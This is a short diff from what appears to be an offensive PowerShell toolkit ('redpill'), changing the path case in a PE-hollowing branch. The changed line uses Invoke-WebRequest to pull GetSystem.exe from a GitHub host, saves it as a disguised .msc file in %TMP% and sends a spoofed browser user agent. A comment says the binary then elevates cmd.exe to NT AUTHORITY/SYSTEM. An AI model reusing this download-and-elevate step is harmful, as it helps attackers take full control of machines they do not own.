@@ -1951,7 +1951,7 @@ If($PEHollow -ne "false"){
 
          If(-not(Test-Path -Path "$Env:TMP\GetSystem.msc" -EA SilentlyContinue)){
             Write-Host "`n`nDownloading GetSystem.msc from GitHub to %tmp%!" -ForegroundColor Green
-            iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/Modules/GetSystem.exe -OutFile $Env:TMP\GetSystem.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+            iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSystem.exe -OutFile $Env:TMP\GetSystem.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
          }
 
          ## Execute Binary to elevate cmd.exe to NT AUTHORITY/SYSTEM
